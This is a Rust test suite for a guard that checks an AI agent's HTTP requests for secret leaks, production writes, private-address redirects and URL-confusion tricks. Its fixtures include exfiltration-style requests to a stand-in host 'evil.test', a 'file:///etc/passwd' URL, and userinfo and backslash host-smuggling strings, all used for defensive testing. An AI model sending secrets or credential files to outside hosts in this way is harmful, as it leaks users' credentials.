use super::hosts::normal_host;
use super::*;
use crate::workspace::tests::{temp_workspace, write};

fn workspace() -> std::path::PathBuf {
    let root = temp_workspace("guard");
    write(
        &root,
        "environments/staging.toml",
        "tag = \"staging\"\nsecrets = [\"token\"]\n[variables]\nbaseUrl = \"https://staging.api.test/v1\"\n",
    );
    write(
        &root,
        "environments/prod.toml",
        "tag = \"production\"\n[variables]\nbaseUrl = \"https://api.test\"\n",
    );
    root
}

fn request(method: &str, url: &str, auth: &str) -> Request {
    let mut request = Request::new("r", method, url);
    if !auth.is_empty() {
        request.headers.push(crate::http_file::Header {
            name: "Authorization".into(),
            value: auth.into(),
        });
    }
    request
}

fn assess(root: &Path, request: &Request, environment: Option<&str>) -> SendAssessment {
    assess_agent_send(root, "r.http", request, environment).unwrap()
}

#[test]
fn secrets_only_go_to_the_environments_hosts() {
    let root = workspace();
    let own = request("GET", "{{baseUrl}}/me", "Bearer {{token}}");
    assert_eq!(
        assess(&root, &own, Some("staging")).secrets_to_new_host,
        None
    );

    let elsewhere = request("GET", "https://evil.test/?t={{token}}", "");
    let why = assess(&root, &elsewhere, Some("staging"))
        .secrets_to_new_host
        .unwrap();
    assert!(why.contains("evil.test"), "{why}");

    // Without secrets, any host is fine.
    let public = request("GET", "https://example.test/", "");
    assert_eq!(
        assess(&root, &public, Some("staging")).secrets_to_new_host,
        None
    );
}

#[test]
fn dotenv_and_chained_values_count_as_secrets() {
    let root = workspace();
    let dotenv = request("GET", "https://evil.test/{{$dotenv DB_PASS}}", "");
    assert!(
        assess(&root, &dotenv, Some("staging"))
            .secrets_to_new_host
            .is_some()
    );
    let chained = request(
        "GET",
        "https://evil.test/{{login.response.body.$.token}}",
        "",
    );
    assert!(
        assess(&root, &chained, Some("staging"))
            .secrets_to_new_host
            .is_some()
    );
}

#[test]
fn workspace_defaults_name_allowed_hosts_without_an_environment() {
    let root = workspace();
    write(
        &root,
        "folder.toml",
        "[variables]\nbaseUrl = \"http://localhost:8000\"\n",
    );
    let local = request("GET", "{{baseUrl}}/x?k={{$dotenv KEY}}", "");
    assert_eq!(assess(&root, &local, None).secrets_to_new_host, None);
}

#[test]
fn notes_process_env_variables() {
    let root = workspace();
    let env = request("GET", "{{baseUrl}}/?u={{$processEnv USER}}", "");
    assert_eq!(
        assess(&root, &env, Some("staging")).process_env.as_deref(),
        Some("$processEnv USER")
    );
    let alias = request("GET", "{{baseUrl}}/?u={{$env.USER}}", "");
    assert!(assess(&root, &alias, Some("staging")).process_env.is_some());
}

#[test]
fn writes_to_a_production_host_count_as_production_from_any_environment() {
    let root = workspace();
    let delete = request("DELETE", "https://api.test/users/1", "");
    for environment in [Some("staging"), None] {
        let assessment = assess(&root, &delete, environment);
        assert_eq!(assessment.production.as_deref(), Some("prod"));
        assert!(assessment.context().production && !assessment.safe);
    }

    let other = request("DELETE", "https://staging.api.test/v1/users/1", "");
    assert_eq!(assess(&root, &other, Some("staging")).production, None);
}

#[test]
fn approved_sends_must_still_look_the_same() {
    let root = workspace();
    let get = request("GET", "{{baseUrl}}/users", "");
    let approved = assess(&root, &get, Some("staging"));
    assert!(!check_approved(&root, "r.http", &get, Some("staging"), Some(&approved)).unwrap());
    assert!(check_approved(&root, "r.http", &get, Some("staging"), None).is_err());

    let delete = request("DELETE", "{{baseUrl}}/users", "");
    let err =
        check_approved(&root, "r.http", &delete, Some("staging"), Some(&approved)).unwrap_err();
    assert_eq!(err.kind(), "conflict");

    // Pointing the environment somewhere else after the approval changes the request too.
    write(
        &root,
        "environments/staging.toml",
        "tag = \"staging\"\n[variables]\nbaseUrl = \"https://api.test\"\n",
    );
    assert!(check_approved(&root, "r.http", &get, Some("staging"), Some(&approved)).is_err());
}

#[test]
fn agents_cant_move_an_environment_to_another_host() {
    let root = workspace();
    let assess =
        |name: &str, value: &str| assess_agent_variable(&root, "staging", name, value).unwrap();
    // Same host, other path: fine.
    assert_eq!(assess("baseUrl", "https://staging.api.test/v2"), None);
    // Other host: needs the user.
    assert!(
        assess("baseUrl", "https://evil.test")
            .unwrap()
            .contains("evil.test")
    );
    // A new URL variable can't point a staging environment at production.
    let prod = assess("adminUrl", "https://api.test/admin").unwrap();
    assert!(prod.contains("production environment prod"), "{prod}");
    // Plain values are never checked.
    assert_eq!(assess("userId", "42"), None);
}

#[test]
fn reads_url_hosts() {
    assert_eq!(
        url_host("https://API.test:8443/x").as_deref(),
        Some("api.test")
    );
    assert_eq!(url_host(" http://[::1]:80/ ").as_deref(), Some("::1"));
    assert_eq!(url_host("api.test"), None);
    assert_eq!(url_host("https://{{host}}/x"), None);
}

fn with_body(url: &str, body: &str) -> Request {
    let mut request = request("POST", url, "");
    request.body = body.into();
    request
}

#[test]
fn body_files_only_go_to_the_environments_hosts_without_asking() {
    let root = workspace();
    write(&root, "data.json", "{}");
    let assess =
        |request: &Request| assess_agent_send(&root, "r.http", request, Some("staging")).unwrap();

    let elsewhere = assess(&with_body("https://evil.test/upload", "< ./data.json"));
    let why = elsewhere.secrets_to_new_host.unwrap();
    assert!(why.contains("file ./data.json"), "{why}");
    assert_eq!(elsewhere.forbidden, None);

    let own = assess(&with_body("{{baseUrl}}/upload", "< ./data.json"));
    assert_eq!(own.secrets_to_new_host, None);
}

#[test]
fn agents_never_send_environment_or_dotenv_files() {
    let root = workspace();
    write(&root, ".env", "KEY=1\n");
    write(&root, "nested/.env.local", "KEY=1\n");
    let multipart = "--b\nContent-Disposition: form-data; name=\"f\"; filename=\"x\"\n\n\
                     < ./nested/.env.local\n--b--";
    for body in [
        "< ./.env",
        "< ./environments/prod.toml",
        "< ./Environments/prod.toml",
        "< ./nested/../.ENV",
        "<@ ./environments/staging.toml",
        multipart,
        "< ./{{token}}.json",
        "< ./{{unknown}}",
    ] {
        let request = with_body("{{baseUrl}}/upload", body);
        let assessment = assess_agent_send(&root, "r.http", &request, Some("staging")).unwrap();
        assert!(assessment.forbidden.is_some(), "{body}");
    }
}

#[cfg(unix)]
#[test]
fn a_link_to_an_environment_file_is_still_an_environment_file() {
    let root = workspace();
    std::os::unix::fs::symlink(root.join("environments/prod.toml"), root.join("data.json"))
        .unwrap();
    let request = with_body("{{baseUrl}}/upload", "< ./data.json");
    let assessment = assess_agent_send(&root, "r.http", &request, Some("staging")).unwrap();
    assert!(assessment.forbidden.is_some());
}

#[test]
fn file_references_made_by_variables_are_seen_too() {
    let root = workspace();
    write(&root, ".env", "KEY=1\n");
    write(
        &root,
        "environments/dev.toml",
        "[variables]\nbaseUrl = \"https://dev.api.test\"\nf = \"./.env\"\n\
         payload = \"a\\n< ./environments/prod.toml\"\n",
    );
    for body in ["< {{f}}", "{{payload}}", "< ./x{{payload}}"] {
        let request = with_body("{{baseUrl}}/upload", body);
        let assessment = assess_agent_send(&root, "r.http", &request, Some("dev")).unwrap();
        assert!(assessment.forbidden.is_some(), "{body}");
    }
}

#[test]
fn downloads_ask_unless_an_environment_points_at_a_public_host() {
    let root = workspace();
    write(
        &root,
        "environments/local.toml",
        "[variables]\nbaseUrl = \"http://localhost:3000\"\n",
    );
    let known = assess_download(&root, "https://staging.api.test/openapi.json").unwrap();
    assert_eq!(known, PermissionContext::default());

    let production = assess_download(&root, "https://api.test/openapi.json").unwrap();
    assert!(production.production);
    assert!(production.unexpected_host.is_some());
    for url in [
        "http://localhost:3000/openapi.json",
        "http://127.0.0.1:8080/admin",
        "http://[::1]/spec",
        "http://10.0.0.5/spec",
        "https://unknown.test/spec",
    ] {
        let why = assess_download(&root, url).unwrap().unexpected_host;
        assert!(why.is_some(), "{url}");
    }
}

#[test]
fn agents_never_read_environment_or_dotenv_files() {
    let root = workspace();
    for rel in [
        "environments/prod.toml",
        "Environments/x.json",
        ".env",
        "api/.ENV.local",
    ] {
        assert!(private_file(&root, &root.join(rel)).is_some(), "{rel}");
    }
    assert!(private_file(&root, &root.join("specs/openapi.json")).is_none());
    assert!(private_file(&root, Path::new("/elsewhere/.env")).is_some());
}

#[test]
fn only_clearly_public_addresses_and_names_count_as_public() {
    for host in [
        "0.0.0.0",
        "::",
        "127.0.0.1",
        "10.1.2.3",
        "100.64.1.1",
        "169.254.169.254",
        "192.0.2.1",
        "255.255.255.255",
        "::1",
        "::ffff:127.0.0.1",
        "::ffff:10.0.0.1",
        "fd00::1",
        "fe80::1",
        "localhost",
        "localhost.",
        "app.localhost",
        "db.internal",
        "printer.local",
    ] {
        assert!(is_private_host(host), "{host}");
    }
    for host in ["8.8.8.8", "2606:4700::1111", "example.com", "api.test"] {
        assert!(!is_private_host(host), "{host}");
    }
}

#[test]
fn agent_redirects_stay_away_from_private_and_production_hosts() {
    let root = workspace();
    let sends = |from: &str| AgentRedirects::for_sends(&root, &format!("https://{from}/")).unwrap();
    assert!(sends("api.test").allows("api.test"), "the same host");
    assert!(sends("staging.api.test").allows("cdn.example.com"));
    assert!(!sends("staging.api.test").allows("api.test"), "production");
    assert!(!sends("staging.api.test").allows("127.0.0.1"));

    let downloads = AgentRedirects::for_downloads(&root, "https://unknown.test/spec").unwrap();
    assert!(downloads.allows("unknown.test"), "the approved host");
    assert!(downloads.allows("staging.api.test"));
    assert!(!downloads.allows("cdn.example.com"), "unknown");
    assert!(!downloads.allows("api.test"), "production");
}

#[test]
fn hosts_are_compared_in_one_form() {
    let root = workspace();
    write(
        &root,
        "environments/live.toml",
        "tag = \"production\"\n[variables]\nbaseUrl = \"https://Live.API.test./\"\n",
    );
    assert_eq!(url_host("https://API.Test./x").as_deref(), Some("api.test"));
    assert_eq!(url_host("http://[::1]:8080/").as_deref(), Some("::1"));
    assert_eq!(normal_host("[FE80::1]"), "fe80::1");
    assert_eq!(normal_host("Api.Test."), "api.test");

    let sends = AgentRedirects::for_sends(&root, "https://Staging.API.test./").unwrap();
    assert!(
        sends.allows("staging.api.test"),
        "the first host, written another way"
    );
    assert!(
        !sends.allows("live.api.test"),
        "production, written another way"
    );
    assert!(!sends.allows("LIVE.api.test."));
    assert!(is_private_host("LocalHost."));
}

#[tokio::test]
async fn agent_lookups_never_lead_a_public_name_to_a_private_address() {
    use reqwest::dns::Resolve;
    let root = workspace();
    let loopback = std::net::IpAddr::from([127, 0, 0, 1]);
    let resolver = AgentRedirects::for_sends(&root, "http://first.example.com/")
        .unwrap()
        .with_fixed("first.example.com", loopback)
        .with_fixed("public.example.com", loopback)
        .with_fixed(
            "cdn.example.com",
            std::net::IpAddr::from([93, 184, 216, 34]),
        )
        .resolver();
    let resolve = |name: &str| resolver.resolve(name.parse().unwrap());

    assert!(
        resolve("first.example.com").await.is_err(),
        "a name no environment points at, approved or not"
    );
    assert!(resolver.follows(&"http://public.example.com/next".parse().unwrap()));
    assert!(
        resolve("public.example.com").await.is_err(),
        "a redirect hop"
    );
    assert!(resolver.follows(&"https://cdn.example.com/".parse().unwrap()));
    assert!(resolve("cdn.example.com").await.is_ok());
    assert!(!resolver.follows(&"http://localhost/".parse().unwrap()));
}

#[tokio::test]
async fn lookups_of_names_the_request_doesnt_reach_pass() {
    use reqwest::dns::Resolve;
    let root = workspace();
    let resolver = AgentRedirects::for_sends(&root, "https://api.example.com/")
        .unwrap()
        .with_fixed("proxy.corp", std::net::IpAddr::from([10, 0, 0, 8]))
        .resolver();
    assert!(
        resolver
            .resolve("proxy.corp".parse().unwrap())
            .await
            .is_ok(),
        "a corporate proxy's own name"
    );
}

#[tokio::test]
async fn an_environments_dev_domains_may_resolve_to_this_machine() {
    use reqwest::dns::Resolve;
    let root = workspace();
    write(
        &root,
        "environments/local.toml",
        "tag = \"local\"\n[variables]\nbaseUrl = \"http://api.myapp.test\"\n\
         authUrl = \"http://auth.myapp.test\"\n",
    );
    let loopback = std::net::IpAddr::from([127, 0, 0, 1]);
    let resolver = AgentRedirects::for_sends(&root, "http://API.myapp.test/users")
        .unwrap()
        .with_fixed("api.myapp.test", loopback)
        .with_fixed("auth.myapp.test", loopback)
        .with_fixed("other.myapp.test", loopback)
        .resolver();
    let resolve = |name: &str| resolver.resolve(name.parse().unwrap());

    assert!(resolve("api.myapp.test").await.is_ok());
    assert!(resolver.follows(&"http://auth.myapp.test/login".parse().unwrap()));
    assert!(
        resolve("auth.myapp.test").await.is_ok(),
        "a hop to another dev name"
    );
    assert!(resolver.follows(&"http://other.myapp.test/".parse().unwrap()));
    assert!(
        resolve("other.myapp.test").await.is_err(),
        "a hop no environment points at"
    );
}

#[tokio::test]
async fn a_literal_test_host_that_resolves_to_this_machine_works_for_agent_sends() {
    use reqwest::dns::Resolve;
    let root = workspace();
    let loopback = std::net::IpAddr::from([127, 0, 0, 1]);
    for name in ["myapp.test", "myapp.example", "myapp.invalid"] {
        let resolver = AgentRedirects::for_sends(&root, &format!("http://{name}/users"))
            .unwrap()
            .with_fixed(name, loopback)
            .with_fixed("hop.test", loopback)
            .resolver();
        assert!(
            resolver.resolve(name.parse().unwrap()).await.is_ok(),
            "{name}: no environment points at it"
        );
        assert!(resolver.follows(&"http://hop.test/".parse().unwrap()));
        assert!(
            resolver.resolve("hop.test".parse().unwrap()).await.is_err(),
            "a redirect to a name no environment points at is still checked"
        );
    }
}

#[test]
fn only_names_under_the_reserved_endings_are_reserved() {
    for host in ["myapp.test", "api.myapp.test", "docs.example", "x.invalid"] {
        assert!(hosts::is_reserved_name(host), "{host}");
    }
    for host in [
        "example.com",
        "test.example.com",
        "mytest.com",
        "latest.dev",
        "contest",
        "8.8.8.8",
    ] {
        assert!(!hosts::is_reserved_name(host), "{host}");
    }
}

#[test]
fn agent_clients_need_a_host_the_app_can_check() {
    let root = workspace();
    for url in [
        "http:///",
        "http://{{host}}/",
        "file:///etc/passwd",
        "not a url",
    ] {
        assert!(AgentRedirects::for_sends(&root, url).is_err(), "{url}");
    }
}

#[tokio::test]
async fn the_first_host_is_the_one_reqwest_reads() {
    use reqwest::dns::Resolve;
    let root = workspace();
    let loopback = std::net::IpAddr::from([127, 0, 0, 1]);
    for (url, real) in [
        ("http://127.0.0.1@evil.example.com/", "evil.example.com"),
        ("http://evil.example.com\\@127.0.0.1/", "evil.example.com"),
        ("http:\\\\evil.example.com/x", "evil.example.com"),
        ("http://evil.example.com@127.0.0.1/", "127.0.0.1"),
    ] {
        assert_eq!(url_host(url).as_deref(), Some(real), "{url}");
        let resolver = AgentRedirects::for_sends(&root, url)
            .unwrap()
            .with_fixed("evil.example.com", loopback)
            .resolver();
        let looked_up = resolver.resolve("evil.example.com".parse().unwrap()).await;
        assert_eq!(looked_up.is_err(), real == "evil.example.com", "{url}");
    }
}
